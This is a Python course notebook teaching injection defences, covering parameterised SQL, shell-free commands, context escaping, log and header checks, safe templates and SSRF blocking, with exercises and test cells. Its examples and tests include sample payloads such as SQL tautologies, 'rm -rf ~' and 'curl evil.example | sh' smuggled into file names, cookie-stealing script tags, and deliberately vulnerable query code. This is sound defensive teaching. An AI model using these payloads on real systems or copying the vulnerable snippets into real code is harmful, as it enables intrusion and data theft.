# Week 79, Day 2: Injection attacks

Companion notebook. The interactive figures, X-ray views, quizzes and auto-marked exercises are on the [lesson page](https://peter-adepoju.github.io/python-atlas/days/w079d2.html). Use this notebook to keep your own copy of the code.

**How to use it:** run each cell with Shift+Enter. Change the code and run it again: that's how you learn.

In [ ]:
# Run this cell once. It lets you check exercise answers inside this notebook.
# Workflow: run your exercise cell, then immediately run the "check" cell below it.
import io, builtins

def check(tests_src):
    """Run an exercise's tests against the cell you ran just before this one."""
    ip = get_ipython()
    code = ip.user_ns["In"][-2]
    def run(feed=(), echo=False):
        out = io.StringIO(); q = [str(x) for x in feed]; real_in, real_print = builtins.input, builtins.print
        def fake_input(p=""):
            if not q:
                raise AssertionError("The program asked for more input than the test gave it.")
            v = q.pop(0); out.write(str(p) + (v + "\n" if echo else "")); return v
        def fake_print(*a, **k):
            k.setdefault("file", out); real_print(*a, **k)
        builtins.input, builtins.print = fake_input, fake_print
        try:
            exec(code, {"__name__": "__main__"})
        finally:
            builtins.input, builtins.print = real_in, real_print
        return out.getvalue()
    norm = lambda t: "\n".join(l.rstrip() for l in str(t).rstrip().splitlines())
    def expect_output(want, inputs=(), echo=False):
        got = run(inputs, echo)
        assert norm(got) == norm(want), f"expected {norm(want)!r} but got {norm(got)!r}"
    import re
    uses = lambda *names: all(re.search(r"\b" + re.escape(n) + r"\b", code) for n in names)
    def run_with(subs, feed=(), echo=False):
        nonlocal code
        saved = code
        for old, new in subs.items():
            code = code.replace(old, new, 1)
        try:
            return run(feed, echo)
        finally:
            code = saved
    env = dict(ip.user_ns, run=run, norm=norm, source=code, expect_output=expect_output, uses=uses, run_with=run_with)
    try:
        env["output"] = run()
    except AssertionError:
        env["output"] = ""
    exec(tests_src, env)
    tests = [(k, v) for k, v in env.items() if k.startswith("test_") and callable(v)]
    ok = 0
    for name, fn in tests:
        label = (fn.__doc__ or name[5:].replace("_", " ")).strip()
        try:
            fn(); ok += 1; print("✓", label)
        except AssertionError as e:
            print("✗", label + ":", e or "not quite yet")
    print(f"{ok} of {len(tests)} checks passed.")


**Predict before you run:** what will this print?



In [ ]:
name = "x' OR '1'='1"
query = f"SELECT * FROM users WHERE name = '{name}'"
print(query)

filename = "photo.jpg; rm -rf ~"
print("convert " + filename + " out.png")

comment = '<img src=x onerror="alert(1)">'
print(f"<p>{comment}</p>")

In [ ]:
import sqlite3

conn = sqlite3.connect(":memory:")
conn.execute("CREATE TABLE users (name TEXT, pin TEXT)")
conn.executemany("INSERT INTO users VALUES (?, ?)", [("admin", "9471"), ("ada", "1234")])

def login_unsafe(name, pin):
    return conn.execute(f"SELECT name FROM users WHERE name = '{name}' AND pin = '{pin}'").fetchall()

def login(name, pin):
    return conn.execute("SELECT name FROM users WHERE name = ? AND pin = ?", (name, pin)).fetchall()

print(login_unsafe("admin' --", "nope"))
print(login("admin' --", "nope"), login("ada", "1234"))

def like_pattern(text):
    return "%" + text.replace("\\", "\\\\").replace("%", "\\%").replace("_", "\\_") + "%"

conn.execute("INSERT INTO users VALUES ('50%_off', '0000')")
print(conn.execute("SELECT name FROM users WHERE name LIKE ?", ("%" + "%" + "%",)).fetchall())
print(conn.execute("SELECT name FROM users WHERE name LIKE ? ESCAPE '\\'", (like_pattern("%"),)).fetchall())

In [ ]:
import shlex

name = "holiday photo.jpg; rm -rf ~"
argv = ["convert", "--", name, "out.png"]
print(argv)
print(shlex.join(argv))
print(shlex.split(shlex.join(argv)) == argv)

In [ ]:
import html

comment = '<script>steal(document.cookie)</script> & "quotes"'
print(f"<p>{html.escape(comment)}</p>")
print(f'<input value="{html.escape(comment)}">')
print(f'<input value="{html.escape(comment, quote=False)}">')

user = "ada\n2026-11-10 09:00 INFO admin logged in"
print(f"2026-11-10 08:59 WARNING failed login for {user!r}")

> **Key idea.** Injection happens when data is pasted into something interpreted (SQL, shell, HTML, logs, headers, templates) and changes its structure. SQL: always parameters (? or :name) for values; allow-lists for identifiers, sort orders and directions; escape LIKE wildcards with ESCAPE; ORMs are safe until raw text() is built with strings. Commands: subprocess.run with a list and no shell, -- before user-supplied names, never let input choose the program; shlex.quote, shlex.join and shlex.split when a command line must be shown or parsed. HTML: escape for the exact context (html.escape for text and quoted attributes; only http(s) URLs in href; urllib.parse.quote inside URLs; never raw data in scripts); templates autoescape unless told otherwise; CSP as a second layer. Reject or escape newlines in logs and headers, and formula characters in CSV. Use string.Template, not str.format, for user-written templates. Block SSRF by allowing only http(s) and refusing private, loopback, link-local and reserved addresses after resolving.

### Exercise: Parameters, always

Write `find_user(conn, name, pin)`: the matching user's `name` (or `None`) from the `users` table, with a parameterised query. Then `like_escape(text)`: the text with `\`, `%` and `_` each preceded by a backslash (backslashes first). And `search(conn, text, limit=20)`: names in `users` containing `text` (case-insensitive, which `LIKE` is for ASCII in SQLite), using `LIKE ? ESCAPE '\'` with your escaping, ordered by name, at most `limit` rows (also a parameter); `limit` must be an `int` from 1 to 100, else raise `ValueError("limit must be 1 to 100")`.

In [ ]:
import sqlite3

def find_user(conn, name, pin):
    ___

def like_escape(text):
    ___

def search(conn, text, limit=20):
    ___

In [ ]:
# Check: run the exercise cell above first, then this one.
check("def _db():\n    import sqlite3\n    conn = sqlite3.connect(\":memory:\")\n    conn.execute(\"CREATE TABLE users (name TEXT, pin TEXT)\")\n    conn.executemany(\"INSERT INTO users VALUES (?, ?)\", [(\"admin\", \"9471\"), (\"ada\", \"1234\"), (\"50%_off\", \"0\"),\n                                                         (\"bob_smith\", \"1\"), (\"bobXsmith\", \"2\"), (\"back\\\\slash\", \"3\")])\n    return conn\n\ndef test_find():\n    \"injection doesn't work\"\n    conn = _db()\n    assert find_user(conn, \"ada\", \"1234\") == \"ada\" and find_user(conn, \"ada\", \"0000\") is None\n    assert find_user(conn, \"admin' --\", \"x\") is None and find_user(conn, \"x' OR '1'='1\", \"x' OR '1'='1\") is None\n\ndef test_search():\n    \"wildcards are literal\"\n    conn = _db()\n    assert like_escape(\"50%_\\\\\") == \"50\\\\%\\\\_\\\\\\\\\"\n    assert search(conn, \"ADA\") == [\"ada\"] and search(conn, \"%\") == [\"50%_off\"]\n    assert search(conn, \"b_s\") == [\"bob_smith\"] and search(conn, \"\\\\\") == [\"back\\\\slash\"]\n    assert search(conn, \"o\", limit=2) == [\"50%_off\", \"bobXsmith\"]\n    assert search(conn, \"' OR 1=1 --\") == []\n    for bad in (0, 101, \"5\", True):\n        try:\n            search(conn, \"a\", limit=bad)\n        except ValueError as e:\n            assert str(e) == \"limit must be 1 to 100\"\n        else:\n            raise AssertionError(bad)")

### Exercise: Sorting and filtering from a query string

Write `list_products(conn, params)`: `params` is a dict of query-string values (all strings). Build one SQL query over `products(id, name, category, price)` with **only fixed SQL text** plus parameters: optional `category` (exact match), optional `max_price` (a whole number, else `ValueError("max_price must be a whole number")`), and `sort`, one of `"name"`, `"price"`, `"-price"` (descending) or `"newest"` (by `id` descending), default `"name"`, else `ValueError(f"can't sort by {SORT!r}")`, mapped through an allow-list dict to a fixed `ORDER BY` clause, with `id` as the tie-breaker. Unknown parameters raise `ValueError(f"unknown parameter: {NAME}")`. Return a list of `(id, name, price)`.

In [ ]:
import sqlite3

SORTS = {"name": "name, id", "price": "price, id", "-price": "price DESC, id", "newest": "id DESC"}

def list_products(conn, params):
    ___

In [ ]:
# Check: run the exercise cell above first, then this one.
check("def _db():\n    import sqlite3\n    conn = sqlite3.connect(\":memory:\")\n    conn.execute(\"CREATE TABLE products (id INTEGER PRIMARY KEY, name TEXT, category TEXT, price INTEGER)\")\n    conn.executemany(\"INSERT INTO products (name, category, price) VALUES (?, ?, ?)\",\n                     [(\"Kettle\", \"kitchen\", 3000), (\"Mug\", \"kitchen\", 800), (\"Lamp\", \"home\", 2500), (\"Toaster\", \"kitchen\", 3000)])\n    return conn\n\ndef test_listing():\n    \"filters and sorts\"\n    conn = _db()\n    assert list_products(conn, {}) == [(1, \"Kettle\", 3000), (3, \"Lamp\", 2500), (2, \"Mug\", 800), (4, \"Toaster\", 3000)]\n    assert list_products(conn, {\"category\": \"kitchen\", \"sort\": \"-price\"}) == [(1, \"Kettle\", 3000), (4, \"Toaster\", 3000), (2, \"Mug\", 800)]\n    assert list_products(conn, {\"max_price\": \"2500\", \"sort\": \"price\"}) == [(2, \"Mug\", 800), (3, \"Lamp\", 2500)]\n    assert list_products(conn, {\"sort\": \"newest\"})[0] == (4, \"Toaster\", 3000)\n    assert list_products(conn, {\"category\": \"kitchen' OR '1'='1\"}) == []\n\ndef test_refusals():\n    \"allow-lists\"\n    conn = _db()\n    for params, message in [({\"sort\": \"price; DROP TABLE products\"}, \"can't sort by 'price; DROP TABLE products'\"),\n                            ({\"sort\": \"(SELECT pin FROM users)\"}, \"can't sort by '(SELECT pin FROM users)'\"),\n                            ({\"max_price\": \"1 OR 1=1\"}, \"max_price must be a whole number\"),\n                            ({\"colour\": \"red\"}, \"unknown parameter: colour\")]:\n        try:\n            list_products(conn, params)\n        except ValueError as e:\n            assert str(e) == message\n        else:\n            raise AssertionError(params)\n    assert conn.execute(\"SELECT count(*) FROM products\").fetchone()[0] == 4")

### Exercise: A command without a shell

Write `thumbnail_command(name, size, fmt)`: the argument list for running `convert` (ImageMagick) to make a thumbnail, as you'd pass it to `subprocess.run`: `["convert", "-thumbnail", "SIZExSIZE", "--", name, "OUT"]`, where OUT is `thumb.FMT`. `size` must be an `int` from 16 to 1024 (`ValueError("size must be 16 to 1024")`), `fmt` one of `png`, `jpg` and `webp` (`ValueError(f"unsupported format: {fmt!r}")`), and `name` a non-empty string without NUL (`ValueError("bad file name")`). Never use a shell. Then `show_command(argv)`: the command line as a person would type it, safely quoted, using `shlex.join`.

In [ ]:
import shlex

def thumbnail_command(name, size, fmt):
    ___

def show_command(argv):
    ___

In [ ]:
# Check: run the exercise cell above first, then this one.
check("def test_command():\n    \"a list, with -- before the name\"\n    import shlex\n    argv = thumbnail_command(\"holiday photo.jpg; rm -rf ~\", 128, \"png\")\n    assert argv == [\"convert\", \"-thumbnail\", \"128x128\", \"--\", \"holiday photo.jpg; rm -rf ~\", \"thumb.png\"]\n    line = show_command(argv)\n    assert line == \"convert -thumbnail 128x128 -- 'holiday photo.jpg; rm -rf ~' thumb.png\"\n    assert shlex.split(line) == argv\n    assert thumbnail_command(\"--output=/etc/passwd\", 16, \"webp\")[3:5] == [\"--\", \"--output=/etc/passwd\"]\n\ndef test_refusals():\n    \"bad values\"\n    for args, message in [((\"a.jpg\", 8, \"png\"), \"size must be 16 to 1024\"), ((\"a.jpg\", \"64\", \"png\"), \"size must be 16 to 1024\"),\n                          ((\"a.jpg\", 64, \"png; sh\"), \"unsupported format: 'png; sh'\"), ((\"\", 64, \"png\"), \"bad file name\"),\n                          ((\"a\\0.jpg\", 64, \"png\"), \"bad file name\")]:\n        try:\n            thumbnail_command(*args)\n        except ValueError as e:\n            assert str(e) == message\n        else:\n            raise AssertionError(args)\n    assert \"shell=True\" not in source and \"os.system\" not in source")

### Exercise: Escaping for the context

Write `safe_url(url)`: the URL unchanged if its scheme (lower-cased, after stripping spaces and control characters from the whole URL) is `http` or `https`, or it's a relative link starting with a single `/` (not `//`); otherwise `"#"`. Then `render_comment(comment)` for a dict with `author`, `text` and `website` (which may be missing or `None`): return `<div class="comment"><a href="URL">AUTHOR</a><p>TEXT</p></div>`, with the URL from `safe_url` and escaped as an attribute, the author and text escaped with `html.escape`, and newlines in the text turned into `<br>` **after** escaping. If there's no website, show the author without a link: `<span>AUTHOR</span>`.

In [ ]:
import html
import re

def safe_url(url):
    ___

def render_comment(comment):
    ___

In [ ]:
# Check: run the exercise cell above first, then this one.
check("def test_urls():\n    \"only web links\"\n    assert safe_url(\"https://ada.example/about?a=1&b=2\") == \"https://ada.example/about?a=1&b=2\"\n    assert safe_url(\"/users/7\") == \"/users/7\"\n    for bad in [\"javascript:alert(1)\", \" JavaScript:alert(1)\", \"java\\tscript:alert(1)\", \"data:text/html,<script>x</script>\",\n                \"//evil.example/x\", \"vbscript:x\", \"mailto:a@b.c\"]:\n        assert safe_url(bad) == \"#\", bad\n\ndef test_render():\n    \"escaped text, attributes and links\"\n    got = render_comment({\"author\": 'Ada <b>\"L\"</b>', \"text\": \"1 < 2 & 3 > 2\\n<script>steal()</script>\", \"website\": 'https://a.example/\"onmouseover=\"x'})\n    assert got == ('<div class=\"comment\"><a href=\"https://a.example/&quot;onmouseover=&quot;x\">Ada &lt;b&gt;&quot;L&quot;&lt;/b&gt;</a>'\n                   '<p>1 &lt; 2 &amp; 3 &gt; 2<br>&lt;script&gt;steal()&lt;/script&gt;</p></div>')\n    assert render_comment({\"author\": \"Bo\", \"text\": \"hi\", \"website\": \"javascript:alert(1)\"}) == '<div class=\"comment\"><a href=\"#\">Bo</a><p>hi</p></div>'\n    assert render_comment({\"author\": \"Cy\", \"text\": \"x\"}) == '<div class=\"comment\"><span>Cy</span><p>x</p></div>'\n    assert render_comment({\"author\": \"Cy\", \"text\": \"x\", \"website\": None}) == '<div class=\"comment\"><span>Cy</span><p>x</p></div>'")

### Exercise: Newlines are code

Write `log_event(event, user)`: a log line `EVENT user=USER`, where the user name is shown with `repr()` if it contains any character that isn't printable (as `str.isprintable` sees it), and as it is otherwise; `event` must be one of `login`, `logout` and `failed_login` (`ValueError(f"unknown event: {event!r}")`). Then `header(name, value)`: `"NAME: VALUE"`, raising `ValueError("header injection")` if either contains `\r` or `\n`, and `ValueError("bad header name")` if the name isn't letters, digits and hyphens. And `csv_cell(value)`: the value with a `'` in front if it starts with `=`, `+`, `-`, `@`, a tab or a carriage return, else unchanged.

In [ ]:
import re

def log_event(event, user):
    ___

def header(name, value):
    ___

def csv_cell(value):
    ___

In [ ]:
# Check: run the exercise cell above first, then this one.
check("def test_logs():\n    \"one line per event\"\n    assert log_event(\"login\", \"ada\") == \"login user=ada\"\n    forged = log_event(\"failed_login\", \"ada\\n2026-11-10 INFO login user=admin\")\n    assert forged == \"failed_login user='ada\\\\n2026-11-10 INFO login user=admin'\" and \"\\n\" not in forged\n    assert log_event(\"logout\", \"zo\u00eb\") == \"logout user=zo\u00eb\"\n    try:\n        log_event(\"drop\", \"x\")\n    except ValueError as e:\n        assert str(e) == \"unknown event: 'drop'\"\n\ndef test_headers_and_csv():\n    \"CRLF and formulas\"\n    assert header(\"Content-Type\", \"text/plain\") == \"Content-Type: text/plain\"\n    for name, value, message in [(\"Location\", \"/home\\r\\nSet-Cookie: admin=1\", \"header injection\"),\n                                 (\"X-A\\nB\", \"1\", \"header injection\"), (\"X A\", \"1\", \"bad header name\")]:\n        try:\n            header(name, value)\n        except ValueError as e:\n            assert str(e) == message\n        else:\n            raise AssertionError(name)\n    assert csv_cell(\"=HYPERLINK(\\\"http://x\\\")\") == \"'=HYPERLINK(\\\"http://x\\\")\"\n    assert [csv_cell(v) for v in [\"+1\", \"-2\", \"@SUM(A1)\", \"\\tx\", \"plain\", \"\", \"a=b\"]] == [\"'+1\", \"'-2\", \"'@SUM(A1)\", \"'\\tx\", \"plain\", \"\", \"a=b\"]")

### Exercise: Webhooks that can't reach inside

Write `check_webhook(url, resolve)`: `resolve(host)` returns a list of IP address strings for a host name (like a DNS lookup). Return the first resolved address if the URL is safe to call, else raise `ValueError` with one of: `"only http and https"` (other schemes); `"no host"`; `"resolves to a forbidden address"` if **any** of the host's addresses is private, loopback, link-local, reserved, multicast or unspecified (use the `ipaddress` module). A host that's already an IP literal (such as `127.0.0.1` or `[::1]`) is checked directly, without `resolve`.

In [ ]:
import ipaddress
from urllib.parse import urlsplit

def check_webhook(url, resolve):
    ___

In [ ]:
# Check: run the exercise cell above first, then this one.
check("def test_webhooks():\n    \"public addresses only\"\n    dns = {\"hooks.example\": [\"93.184.216.34\"], \"sneaky.example\": [\"93.184.216.34\", \"10.0.0.5\"], \"meta.example\": [\"169.254.169.254\"],\n           \"v6.example\": [\"2606:2800:220:1:248:1893:25c8:1946\"]}\n    resolve = lambda host: dns[host]\n    assert check_webhook(\"https://hooks.example/notify\", resolve) == \"93.184.216.34\"\n    assert check_webhook(\"http://v6.example:8080/x\", resolve) == \"2606:2800:220:1:248:1893:25c8:1946\"\n    assert check_webhook(\"https://8.8.8.8/x\", resolve) == \"8.8.8.8\"\n    for url, message in [(\"ftp://hooks.example/x\", \"only http and https\"), (\"file:///etc/passwd\", \"only http and https\"),\n                         (\"https:///nohost\", \"no host\"), (\"http://127.0.0.1:6379/\", \"resolves to a forbidden address\"),\n                         (\"http://[::1]/\", \"resolves to a forbidden address\"), (\"http://sneaky.example/\", \"resolves to a forbidden address\"),\n                         (\"http://meta.example/latest\", \"resolves to a forbidden address\"), (\"http://192.168.1.1/admin\", \"resolves to a forbidden address\"),\n                         (\"http://0.0.0.0/\", \"resolves to a forbidden address\")]:\n        try:\n            check_webhook(url, resolve)\n        except ValueError as e:\n            assert str(e) == message, url\n        else:\n            raise AssertionError(url)")

### Bug hunt: A search that found everything

The search pastes the term into the SQL, so the term `' OR '1'='1` matches every row and this prints `3`. Use a parameter, so it prints `0`.

In [ ]:
import sqlite3

conn = sqlite3.connect(":memory:")
conn.execute("CREATE TABLE notes (owner TEXT, body TEXT)")
conn.executemany("INSERT INTO notes VALUES (?, ?)", [("ada", "hi"), ("bob", "secret"), ("cy", "plans")])
term = "' OR '1'='1"
rows = conn.execute(f"SELECT body FROM notes WHERE owner = '{term}'").fetchall()
print(len(rows))

In [ ]:
# Check: run the exercise cell above first, then this one.
check("def test_output():\n    \"a parameter\"\n    expect_output(\"0\")")

### Bug hunt: A greeting that leaked a secret

Users can write their own greeting template, and it's filled in with `str.format`, which follows attributes: this one walks from the user object to the module's globals and prints the API key, `Hi sk_live_51Hx`. Use `string.Template` with `$name` placeholders and `safe_substitute`, passing only the user's name, so the same template prints the placeholder text unfilled: `Hi {user.__init__.__globals__[API_KEY]}`.

In [ ]:
API_KEY = "sk_live_51Hx"

class User:
    def __init__(self, name):
        self.name = name

template = "Hi {user.__init__.__globals__[API_KEY]}"
print(template.format(user=User("Ada")))

In [ ]:
# Check: run the exercise cell above first, then this one.
check("def test_output():\n    \"string.Template\"\n    expect_output(\"Hi {user.__init__.__globals__[API_KEY]}\")\n    assert \"Template\" in source and \".format(\" not in source")

### Bug hunt: Breaking out of an attribute

`quote=False` leaves `"` alone, so a value can close the `value="..."` attribute and add an event handler of its own; this prints `<input value="" autofocus onfocus="steal()">`. Escape quotes too, so it prints `<input value="&quot; autofocus onfocus=&quot;steal()">`.

In [ ]:
import html

name = '" autofocus onfocus="steal()'
print(f'<input value="{html.escape(name, quote=False)}">')

In [ ]:
# Check: run the exercise cell above first, then this one.
check("def test_output():\n    \"quote=True\"\n    expect_output('<input value=\"&quot; autofocus onfocus=&quot;steal()\">')")

### Puzzle: A safe update

Arrange a function that renames a user's project, checking the new name and using a parameterised query that also checks ownership. One line is a trap.

(Put these lines in order on the website.)

### Exercise: Predict them



In [ ]:
p = ___   # html.escape('<a href="x">')
q = ___   # shlex.quote("a b")
r = ___   # True or False: a ? placeholder can stand for a column name
s = ___   # ipaddress.ip_address("10.1.2.3").is_private
t = ___   # the line separator characters that enable header injection, as one string

In [ ]:
# Check: run the exercise cell above first, then this one.
check("def test_values():\n    \"each\"\n    assert p == \"&lt;a href=&quot;x&quot;&gt;\" and q == \"'a b'\" and r is False, \"p, q and r\"\n    assert s is True and t == \"\\r\\n\", \"s and t\"")

### Quiz

Take this quiz on the website: it is marked for you and feeds your daily review.

### Exercise: Challenge: a search page

Write `search_page(conn, params)` returning `(status, html)` for a product search page over the table `products(id, name, category, price)` (price in pence). `params` holds query-string values (strings). Allowed parameters: `q` (required, 1 to 50 characters after stripping), `sort` (`relevance`, `price` or `-price`; default `relevance`, meaning names that **start** with the term first, then the rest, each by name), `page` (a whole number from 1, default 1); 10 results a page. Any problem (an unknown parameter, a missing or bad value) gives `(400, "<p>Bad search: MESSAGE</p>")` with MESSAGE from: `unknown parameter`, `q must be 1 to 50 characters`, `bad sort`, `bad page`. Match names containing `q` with `LIKE` and proper escaping, all values as parameters, and the `ORDER BY` from an allow-list (relevance can be written as `ORDER BY (name LIKE ? ESCAPE '\') DESC, name, id` with the prefix pattern as a parameter; the others add `, id`). The page (status `200`) is `<h1>Results for "Q"</h1>` (escaped, quotes included), then `<ul>` with one `<li><a href="/products/ID">NAME</a> £POUNDS.PENCE</li>` per result (name escaped), then `</ul>`, then `<p>Page P</p>`, all joined with newlines. With no results: the heading, then `<p>No products match.</p>`.

In [ ]:
import html
import sqlite3

SORTS = {"price": "price, id", "-price": "price DESC, id"}

def search_page(conn, params):
    ___

In [ ]:
# Check: run the exercise cell above first, then this one.
check("def _db():\n    import sqlite3\n    conn = sqlite3.connect(\":memory:\")\n    conn.execute(\"CREATE TABLE products (id INTEGER PRIMARY KEY, name TEXT, category TEXT, price INTEGER)\")\n    names = [(\"Tea pot\", 2500), (\"Green tea\", 450), (\"Teaspoon <set>\", 899), (\"Steam iron\", 3999), (\"Kettle\", 3000), (\"100% tea\", 1)]\n    names += [(f\"Tea bag {i:02d}\", 100 + i) for i in range(12)]\n    conn.executemany(\"INSERT INTO products (name, category, price) VALUES (?, 'x', ?)\", names)\n    return conn\n\ndef test_results():\n    \"relevance, escaping and prices\"\n    conn = _db()\n    status, page = search_page(conn, {\"q\": \"tea\"})\n    lines = page.split(\"\\n\")\n    assert status == 200 and lines[0] == '<h1>Results for \"tea\"</h1>' and lines[1] == \"<ul>\"\n    assert lines[2] == '<li><a href=\"/products/7\">Tea bag 00</a> \u00a31.00</li>'\n    assert len(lines) == 14 and lines[-2] == \"</ul>\" and lines[-1] == \"<p>Page 1</p>\"\n    status, page = search_page(conn, {\"q\": \"tea\", \"page\": \"2\"})\n    lines = page.split(\"\\n\")\n    assert lines[2:-2] == ['<li><a href=\"/products/17\">Tea bag 10</a> \u00a31.10</li>', '<li><a href=\"/products/18\">Tea bag 11</a> \u00a31.11</li>',\n                           '<li><a href=\"/products/1\">Tea pot</a> \u00a325.00</li>', '<li><a href=\"/products/3\">Teaspoon &lt;set&gt;</a> \u00a38.99</li>',\n                           '<li><a href=\"/products/6\">100% tea</a> \u00a30.01</li>', '<li><a href=\"/products/2\">Green tea</a> \u00a34.50</li>',\n                           '<li><a href=\"/products/4\">Steam iron</a> \u00a339.99</li>']\n    status, page = search_page(conn, {\"q\": \" TEA \", \"sort\": \"-price\"})\n    assert page.split(\"\\n\")[2] == '<li><a href=\"/products/4\">Steam iron</a> \u00a339.99</li>' and page.startswith('<h1>Results for \"TEA\"</h1>')\n    assert search_page(conn, {\"q\": \"%\"})[1].split(\"\\n\")[2] == '<li><a href=\"/products/6\">100% tea</a> \u00a30.01</li>'\n\ndef test_hostile():\n    \"injection and bad parameters\"\n    conn = _db()\n    status, page = search_page(conn, {\"q\": '\"><script>x()</script>'})\n    assert status == 200 and page == '<h1>Results for \"&quot;&gt;&lt;script&gt;x()&lt;/script&gt;\"</h1>\\n<p>No products match.</p>'\n    assert search_page(conn, {\"q\": \"' OR '1'='1\"})[1].endswith(\"<p>No products match.</p>\")\n    for params, message in [({}, \"q must be 1 to 50 characters\"), ({\"q\": \"   \"}, \"q must be 1 to 50 characters\"), ({\"q\": \"x\" * 51}, \"q must be 1 to 50 characters\"),\n                            ({\"q\": \"tea\", \"sort\": \"name; DROP TABLE products\"}, \"bad sort\"), ({\"q\": \"tea\", \"page\": \"0\"}, \"bad page\"),\n                            ({\"q\": \"tea\", \"page\": \"1 OR 1\"}, \"bad page\"), ({\"q\": \"tea\", \"debug\": \"1\"}, \"unknown parameter\")]:\n        assert search_page(conn, params) == (400, f\"<p>Bad search: {message}</p>\"), params\n    assert conn.execute(\"SELECT count(*) FROM products\").fetchone()[0] == 18")

## Warm-up

Three languages, one mistake. Each line builds code (SQL, a shell command, HTML) by pasting data into a string, and the data contains its own code: a condition that's always true, a second command, a script. To the database, the shell and the browser, there's no way to tell which parts you meant.

## SQL injection

When you build a query with an f-string, a user's value becomes part of the **SQL text**, and SQL characters in it change the query's meaning:

```python
conn.execute(f"SELECT * FROM users WHERE name = '{name}' AND pin = '{pin}'")
```

With `name` set to `admin' --`, the query becomes `... WHERE name = 'admin' --' AND pin = ''`: everything after `--` is a comment, and the PIN check disappears. Attackers use the same trick to read other tables (`' UNION SELECT ...`), change data, and sometimes take over the server. It has been one of the most damaging web vulnerabilities for over twenty years.

The fix is **parameters** (placeholders), as in Week 75: the SQL text is fixed, and values are sent **separately**, so the database never parses them as SQL:

```python
conn.execute("SELECT * FROM users WHERE name = ? AND pin = ?", (name, pin))
```

Three details:

- **Identifiers can't be parameters.** A placeholder holds a value, never a column or table name, or `ASC`/`DESC`. When those come from input (a "sort by" option), map the input through an **allow-list**: `{"name": "name", "newest": "created_at DESC"}`, and refuse anything else.
- **`LIKE` has its own wildcards.** In `name LIKE ?`, a user's `%` or `_` still acts as a wildcard (searching for `%` matches everything). Escape them, and say which escape character you used: `LIKE ? ESCAPE '\'` with `%`, `_` and `\` each preceded by `\`.
- **ORMs help, until you bypass them.** SQLAlchemy's query building uses parameters for you, but raw SQL through `text(...)` with f-strings is just as injectable. Use `text("... WHERE id = :id")` with bound values.

## Command injection

`os.system("convert " + name)` and `subprocess.run(text, shell=True)` hand a **string** to the shell, which interprets `;`, `&&`, `|`, `$(...)`, backquotes, `>` and wildcards. A file name like `a.jpg; curl evil.example | sh` runs the attacker's commands with your program's permissions.

**Don't use a shell.** Pass a **list** of arguments, and the program receives each exactly as given, with no shell to interpret anything:

```python
subprocess.run(["convert", name, "-quality", str(quality), "out.png"], check=True, timeout=60)
```

Two more traps remain even without a shell:

- **Argument injection**: a "file name" starting with `-` (such as `--output=/etc/passwd` or `-rf`) is read as an **option**. Put `--` before user-supplied names (most tools treat everything after `--` as a plain argument), or prefix them with `./`.
- **Choosing the program**: never let input pick which program runs; allow-list it.

If you truly must build a shell command line (to show it to the user, or run it on a remote machine), quote each piece with **`shlex.quote`**, or join a list with **`shlex.join`**, and split a command line safely with `shlex.split`. (The browser can't run programs, so today's exercises build the argument lists; on your own computer, `subprocess.run` takes them as they are.)

## HTML and other contexts

**Cross-site scripting (XSS)** is injection into a web page. If a comment, a name or a search term is put into HTML without escaping, a `<script>` in it runs in the browser of **everyone who views the page**, with their session: it can read their data, act as them, or show a fake login form.

The defence is to **escape for the exact context** the value lands in:

| Context | Example | Escape with |
|---|---|---|
| HTML text | `<p>{value}</p>` | `html.escape(value)` (`<`, `>` and `&`) |
| an attribute | `<input value="{value}">` | `html.escape(value, quote=True)` (the default), and always quote the attribute |
| a URL in `href` or `src` | `<a href="{url}">` | check the scheme is `http` or `https` (a `javascript:` URL runs code), then escape it as an attribute |
| a part of a URL | `/search?q={value}` | `urllib.parse.quote(value)` or `urlencode` |
| inside `<script>` | `var x = {value};` | don't; put data in a `data-` attribute or a JSON `<script type="application/json">` block |

Template engines such as **Jinja2** (used by Flask) escape automatically in HTML templates; the danger comes back with `|safe`, `Markup(...)` or building HTML in Python strings. A **Content-Security-Policy** header that forbids inline scripts is a strong second layer.

**Newlines are code too**, in line-based formats:

- **Log injection**: a username containing `\n2026-11-10 INFO admin logged in` adds a fake line to your logs. Escape or reject control characters before logging (`repr()` is a quick way to make them visible).
- **Header injection**: a value with `\r\n` in an HTTP header (a redirect location, a file name in `Content-Disposition`) can add headers or a body of the attacker's choosing. Reject `\r` and `\n` in header values.
- **CSV injection**: a cell starting with `=`, `+`, `-` or `@` is run as a formula when a spreadsheet opens an exported file. Prefix such cells with `'`.

The third line shows why the default `quote=True` matters: without escaping `"`, a value can close the attribute and add its own (`" onfocus="steal()`).

## Templates and server-side requests

**Template injection.** Letting users write their own templates is a feature (custom email messages), but `str.format` with user-written text can reach far more than you meant: `"{user.__init__.__globals__}"` walks from an object to the module's global variables, secrets included. For user-written templates, use **`string.Template`** (`$name` placeholders, no attribute access, and `safe_substitute` leaves unknown names alone) or a sandboxed engine, and pass only plain values.

**Server-side request forgery (SSRF).** Features that fetch a URL the user gives (a webhook, a link preview, "import from URL") can be pointed at addresses **inside** your network: `http://127.0.0.1:6379/`, `http://192.168.0.1/admin`, or the cloud metadata service at `http://169.254.169.254/`, which hands out credentials. Allow only `http` and `https`, resolve the host name, and refuse loopback, private, link-local and other reserved addresses (the `ipaddress` module knows them all: `ip.is_private`, `ip.is_loopback`, `ip.is_link_local`, `ip.is_reserved`, `ip.is_multicast`), and connect to the address you checked, not to a name that might resolve differently a second later.

**Others worth knowing**: XML parsers that expand entities can read local files or exhaust memory (use **defusedxml**), and regular expressions with nested repetition (`(a+)+$`) can take minutes on a crafted string (ReDoS): keep patterns simple and limit input length.

### On your own computer

Try your own code against these attacks in a safe place. Bandit flags SQL built with f-strings and `shell=True`, and **sqlmap** (for your own applications only) tests web forms for SQL injection automatically. The OWASP Cheat Sheet Series has a page for each injection type, with the exact escaping rules for every context.

## Practice

## Quiz

## Daily challenge

## Before you go

Search a project of your own for `execute(f"`, `shell=True`, `|safe` and `.format(` and look at each one with today's eyes. Tomorrow: **secrets and configuration**: keeping passwords, keys and tokens out of code, repositories and logs.